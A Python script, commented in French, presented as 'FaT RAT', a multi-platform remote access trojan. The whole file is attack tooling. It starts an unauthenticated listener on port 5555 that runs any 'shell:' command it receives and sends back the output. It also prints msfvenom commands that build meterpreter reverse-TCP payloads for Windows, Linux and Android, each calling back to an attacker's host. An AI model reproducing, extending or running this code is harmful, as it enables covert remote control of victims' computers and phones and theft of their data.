#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
FaT RAT - Remote Access Trojan (RAT) Multi-plateforme
Fonctionnalités inspirées de FatRat Kali Linux :
• Génération de payloads (Windows, Linux, Android)
• Reverse shell
• Listener multi-plateforme
• Adaptation automatique Linux/Windows
"""

import sys
import os
import socket
import threading


import platform

class FatRat:
    def __init__(self, host='0.0.0.0', port=5555):
        self.host = host
        self.port = port
        self.server = None
        self.clients = []
        self.is_linux = platform.system() == 'Linux'
        self.is_windows = platform.system() == 'Windows'

    def start_server(self):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.bind((self.host, self.port))
        self.server.listen(5)
        print(f"[+] FaT RAT server started on {self.host}:{self.port}")
        while True:
            client, addr = self.server.accept()
            print(f"[+] Connection from {addr}")
            self.clients.append(client)
            threading.Thread(target=self.handle_client, args=(client, addr)).start()

    def handle_client(self, client, addr):
        try:
            while True:
                data = client.recv(4096)
                if not data:
                    break
                print(f"[DATA] {addr}: {data.decode(errors='ignore')}")
                # Command execution (Linux/Windows)
                cmd = data.decode(errors='ignore').strip()
                if cmd.startswith('shell:'):
                    command = cmd[6:]
                    output = self.execute_command(command)
                    client.sendall(output.encode())
                else:
                    client.sendall(b'ACK')
        except Exception as e:
            print(f"[!] Error with {addr}: {e}")
        finally:
            client.close()
            print(f"[-] Disconnected {addr}")

    def execute_command(self, command):
        try:
            if self.is_linux:
                return os.popen(command).read()
            elif self.is_windows:
                return os.popen(command).read()
            else:
                return "Unsupported OS"
        except Exception as e:
            return f"Error: {e}"

    def generate_payload(self, payload_type, lhost, lport):
        """Génère un payload comme FatRat Kali Linux"""
        if payload_type == 'windows':
            return f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe > payload.exe"
        elif payload_type == 'linux':
            return f"msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f elf > payload.elf"
        elif payload_type == 'android':
            return f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} R > payload.apk"
        else:
            return "Type de payload non supporté."


if __name__ == "__main__":
    rat = FatRat()
    print("[FaT RAT] Multi-plateforme (Linux/Windows/Android)")
    print("[FaT RAT] Commandes disponibles :")
    print("- start : Démarrer le listener")
    print("- payload : Générer un payload (windows/linux/android)")
    print("- exit : Quitter")
    while True:
        cmd = input("FaT RAT > ").strip()
        if cmd == "start":
            try:
                rat.start_server()
            except KeyboardInterrupt:
                print("[!] Server stopped by user.")
                sys.exit(0)
        elif cmd.startswith("payload"):
            parts = cmd.split()
            if len(parts) == 4:
                _, ptype, lhost, lport = parts
                print(rat.generate_payload(ptype, lhost, lport))
            else:
                print("Usage: payload [windows|linux|android] LHOST LPORT")
        elif cmd == "exit":
            print("Bye!")
            break
        else:
            print("Commande inconnue. start | payload | exit")
